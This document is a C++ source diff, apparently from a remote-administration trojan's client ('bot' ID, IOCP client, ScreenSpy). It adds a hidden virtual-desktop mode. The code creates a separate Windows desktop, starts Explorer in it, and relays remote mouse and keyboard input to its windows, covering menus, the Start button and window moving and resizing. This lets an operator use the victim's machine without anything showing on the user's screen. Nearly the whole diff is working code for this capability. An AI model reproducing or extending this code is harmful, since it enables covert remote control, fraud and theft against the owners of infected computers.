@@ -15,6 +15,8 @@
 
 #include "ScreenSpy.h"
 #include "ScreenCapturerDXGI.h"
+#include <Shlwapi.h>
+#include <shlobj_core.h>
 
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -43,9 +45,92 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
 {
 	m_bIsWorking = TRUE;
 	m_bIsBlockInput = FALSE;
+	g_hDesk = nullptr;
+	m_DesktopID = GetBotId();
+	m_ScreenSpyObject = nullptr;
+	m_ptrUser = (INT_PTR)user;
 
-	int DXGI = 0;
+	m_point = {};
+	m_lastPoint = {};
+	m_lmouseDown = FALSE;
+	m_hResMoveWindow = nullptr;
+	m_resMoveType = 0;
+	m_rmouseDown = FALSE;
+	m_rclickPoint = {};
+	m_rclickWnd = nullptr;
+
+	m_hWorkThread = CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
+}
+
+
+std::wstring ConvertToWString(const std::string& multiByteStr) {
+	int len = MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, NULL, 0);
+	if (len == 0) return L""; // 转换失败
+
+	std::wstring wideStr(len, L'\0');
+	MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, &wideStr[0], len);
+
+	return wideStr;
+}
+
+bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName) {
+	bool bReturn = false;
+
+	try {
+		if (!pszApplicationFilePath || !pszDesktopName || !strlen(pszApplicationFilePath) || !strlen(pszDesktopName))
+			return false;
+
+		TCHAR szDirectoryName[MAX_PATH * 2] = { 0 };
+		TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
+
+		strcpy_s(szDirectoryName, strlen(pszApplicationFilePath) + 1, pszApplicationFilePath);
+
+		std::wstring path = ConvertToWString(pszApplicationFilePath);
+		if (!PathIsExe(path.c_str()))
+			return false;
+		PathRemoveFileSpec(szDirectoryName);
+		STARTUPINFO sInfo = { 0 };
+		PROCESS_INFORMATION pInfo = { 0 };
+
+		sInfo.cb = sizeof(sInfo);
+		sInfo.lpDesktop = pszDesktopName;
+
+		//Launching a application into desktop
+		BOOL bCreateProcessReturn = CreateProcess(pszApplicationFilePath,
+			NULL,
+			NULL,
+			NULL,
+			TRUE,
+			NORMAL_PRIORITY_CLASS,
+			NULL,
+			szDirectoryName,
+			&sInfo,
+			&pInfo);
+
+		TCHAR* pszError = NULL;
+		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+			NULL, GetLastError(), 0, reinterpret_cast<LPTSTR>(&pszError), 0, NULL);
+
+		if (pszError) {
+			Mprintf("CreateProcess [%s] failed: %s\n", pszApplicationFilePath, pszError);
+			LocalFree(pszError);  // 释放内存
+		}
+
+		if (bCreateProcessReturn)
+			bReturn = true;
+
+	}
+	catch (...) {
+		bReturn = false;
+	}
+
+	return bReturn;
+}
+
+void CScreenManager::InitScreenSpy() {
+	int DXGI = USING_GDI;
 	BYTE algo = ALGORITHM_DIFF;
+	BYTE* user = (BYTE*)m_ptrUser;
 	if (!(user == NULL || (int)user == 1)) {
 		UserParam* param = (UserParam*)user;
 		if (param) {
@@ -53,11 +138,36 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
 			algo = param->length > 1 ? param->buffer[1] : algo;
 			delete param;
 		}
-	} else {
+	}
+	else {
 		DXGI = (int)user;
 	}
 	Mprintf("CScreenManager: Type %d Algorithm: %d\n", DXGI, int(algo));
-	if ((1==DXGI && IsWindows8orHigher()))
+	if (DXGI == USING_VIRTUAL) {
+		HDESK hDesk = SelectDesktop((char*)m_DesktopID.c_str());
+		if (!hDesk) {
+			if (hDesk = CreateDesktop(m_DesktopID.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL)) {
+				Mprintf("创建虚拟屏幕成功: %s\n", m_DesktopID.c_str());
+				TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
+				GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
+				strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
+				if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
+					Mprintf("启动资源管理器失败[%s]!!!\n", m_DesktopID.c_str());
+				}
+			}
+			else {
+				Mprintf("创建虚拟屏幕失败: %s\n", m_DesktopID.c_str());
+			}
+		}
+		else {
+			Mprintf("打开虚拟屏幕成功: %s\n", m_DesktopID.c_str());
+		}
+		if (hDesk) {
+			SetThreadDesktop(g_hDesk = hDesk);
+		}
+	}
+
+	if ((USING_DXGI == DXGI && IsWindows8orHigher()))
 	{
 		auto s = new ScreenCapturerDXGI(algo);
 		if (s->IsInitSucceed()) {
@@ -71,16 +181,15 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
 	}
 	else
 	{
-		m_ScreenSpyObject = new CScreenSpy(32, algo);
+		m_ScreenSpyObject = new CScreenSpy(32, algo, DXGI == USING_VIRTUAL);
 	}
-
-	m_hWorkThread = CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
 }
-
 
 DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 {
 	CScreenManager *This = (CScreenManager *)lParam;
+
+	This->InitScreenSpy();
 
 	This->SendBitMapInfo(); //发送bmp位图结构
 
@@ -285,6 +394,12 @@ VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength
 	m_ClientObject->OnServerSending(szBuffer, ulNextSendLength);
 }
 
+std::string GetTitle(HWND hWnd) {
+	char title[256]; // 预留缓冲区
+	GetWindowTextA(hWnd, title, sizeof(title));
+	return title;
+}
+
 VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 {
 	int msgSize = sizeof(MSG64);
@@ -301,6 +416,210 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 	BYTE* ptr = szBuffer;
 	MSG32 msg32;
 	MSG64 msg64;
+	if (g_hDesk) {
+		HWND  hWnd = NULL;
+		BOOL  mouseMsg = FALSE;
+		POINT lastPointCopy = {};
+		SetThreadDesktop(g_hDesk);
+		for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize) {
+			MYMSG* msg = msgSize == 48 ? (MYMSG*)ptr :
+				(MYMSG*)msg64.Create(msg32.Create(ptr, msgSize));
+			switch (msg->message) {
+			case WM_KEYUP:
+				return;
+			case WM_CHAR:
+
+			case WM_KEYDOWN: {
+				m_point = m_lastPoint;
+				hWnd = WindowFromPoint(m_point);
+				break;
+			}
+			case WM_RBUTTONDOWN: {
+				// 记录右键按下时的坐标
+				m_rmouseDown = TRUE;
+				m_rclickPoint = msg->pt;
+				break;
+			}
+			case WM_RBUTTONUP: {
+				m_rmouseDown = FALSE;
+				m_rclickWnd = WindowFromPoint(m_rclickPoint);
+				// 检查是否为系统菜单（如任务栏）
+				char szClass[256];
+				GetClassNameA(m_rclickWnd, szClass, sizeof(szClass));
+				Mprintf("Right click on '%s' %s[%p]\n", szClass, GetTitle(hWnd).c_str(), hWnd);
+				if (strcmp(szClass, "Shell_TrayWnd") == 0) {
+					// 触发系统级右键菜单（任务栏）
+					PostMessage(m_rclickWnd, WM_CONTEXTMENU, (WPARAM)m_rclickWnd,
+						MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y));
+				}
+				else {
+					// 普通窗口的右键菜单
+					if (!PostMessage(m_rclickWnd, WM_RBUTTONUP, msg->wParam,
+						MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y))) {
+						// 附加：模拟键盘按下Shift+F10（备用菜单触发方式）
+						keybd_event(VK_SHIFT, 0, 0, 0);
+						keybd_event(VK_F10, 0, 0, 0);
+						keybd_event(VK_F10, 0, KEYEVENTF_KEYUP, 0);
+						keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
+					}
+				}
+				break;
+			}
+			default:
+			{
+				mouseMsg = TRUE;
+				m_point = msg->pt;
+				hWnd = WindowFromPoint(m_point);
+				lastPointCopy = m_lastPoint;
+				m_lastPoint = m_point;
+				if (msg->message == WM_LBUTTONUP) {
+					if (m_rclickWnd && hWnd != m_rclickWnd)
+					{
+						PostMessageA(m_rclickWnd, WM_LBUTTONDOWN, MK_LBUTTON, 0);
+						PostMessageA(m_rclickWnd, WM_LBUTTONUP, MK_LBUTTON, 0);
+						m_rclickWnd = nullptr;
+					}
+					m_lmouseDown = FALSE;
+					LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
+					switch (lResult) {
+					case HTTRANSPARENT: {
+						SetWindowLongA(hWnd, GWL_STYLE, GetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
+						lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
+						break;
+					}
+					case HTCLOSE: {// 关闭窗口
+						PostMessageA(hWnd, WM_CLOSE, 0, 0);
+						Mprintf("Close window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
+						break;
+					}
+					case HTMINBUTTON: {// 最小化
+						PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
+						Mprintf("Minsize window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
+						break;
+					}
+					case HTMAXBUTTON: {// 最大化
+						WINDOWPLACEMENT windowPlacement;
+						windowPlacement.length = sizeof(windowPlacement);
+						GetWindowPlacement(hWnd, &windowPlacement);
+						if (windowPlacement.flags & SW_SHOWMAXIMIZED)
+							PostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
+						else
+							PostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
+						Mprintf("Maxsize window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
+						break;
+					}
+					}
+				}
+				else if (msg->message == WM_LBUTTONDOWN) {
+					m_lmouseDown = TRUE;
+					m_hResMoveWindow = NULL;
+					RECT startButtonRect;
+					HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
+					GetWindowRect(hStartButton, &startButtonRect);
+					if (PtInRect(&startButtonRect, m_point)) {
+						PostMessageA(hStartButton, BM_CLICK, 0, 0); // 模拟开始按钮点击
+						continue;
+					}
+					else {
+						char windowClass[MAX_PATH] = { 0 };
+						RealGetWindowClassA(hWnd, windowClass, MAX_PATH);
+						if (!lstrcmpA(windowClass, "#32768")) {
+							HMENU hMenu = (HMENU)SendMessageA(hWnd, MN_GETHMENU, 0, 0);
+							int itemPos = MenuItemFromPoint(NULL, hMenu, m_point);
+							int itemId = GetMenuItemID(hMenu, itemPos);
+							PostMessageA(hWnd, 0x1e5, itemPos, 0);
+							PostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
+							continue;
+						}
+					}
+				}
+				else if (msg->message == WM_MOUSEMOVE) {
+					if (!m_lmouseDown)
+						continue;
+					if (!m_hResMoveWindow)
+						m_resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
+					else
+						hWnd = m_hResMoveWindow;
+					int moveX = lastPointCopy.x - m_point.x;
+					int moveY = lastPointCopy.y - m_point.y;
+
+					RECT rect;
+					GetWindowRect(hWnd, &rect);
+					int x = rect.left;
+					int y = rect.top;
+					int width = rect.right - rect.left;
+					int height = rect.bottom - rect.top;
+					switch (m_resMoveType) {
+					case HTCAPTION: {
+						x -= moveX;
+						y -= moveY;
+						break;
+					}
+					case HTTOP: {
+						y -= moveY;
+						height += moveY;
+						break;
+					}
+					case HTBOTTOM: {
+						height -= moveY;
+						break;
+					}
+					case HTLEFT: {
+						x -= moveX;
+						width += moveX;
+						break;
+					}
+					case HTRIGHT: {
+						width -= moveX;
+						break;
+					}
+					case HTTOPLEFT: {
+						y -= moveY;
+						height += moveY;
+						x -= moveX;
+						width += moveX;
+						break;
+					}
+					case HTTOPRIGHT: {
+						y -= moveY;
+						height += moveY;
+						width -= moveX;
+						break;
+					}
+					case HTBOTTOMLEFT: {
+						height -= moveY;
+						x -= moveX;
+						width += moveX;
+						break;
+					}
+					case HTBOTTOMRIGHT: {
+						height -= moveY;
+						width -= moveX;
+						break;
+					}
+					default:
+						continue;
+					}
+					MoveWindow(hWnd, x, y, width, height, FALSE);
+					m_hResMoveWindow = hWnd;
+					continue;
+				}
+				break;
+			}
+			}
+			for (HWND currHwnd = hWnd;;) {
+				hWnd = currHwnd;
+				ScreenToClient(currHwnd, &m_point);
+				currHwnd = ChildWindowFromPoint(currHwnd, m_point);
+				if (!currHwnd || currHwnd == hWnd)
+					break;
+			}
+			if (mouseMsg)
+				msg->lParam = MAKELPARAM(m_point.x, m_point.y);
+			PostMessage(hWnd, msg->message, (WPARAM)msg->wParam, msg->lParam);
+		}
+		return;
+	}
 	for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize)
 	{
 		MSG64* Msg = msgSize == 48 ? (MSG64*)ptr :
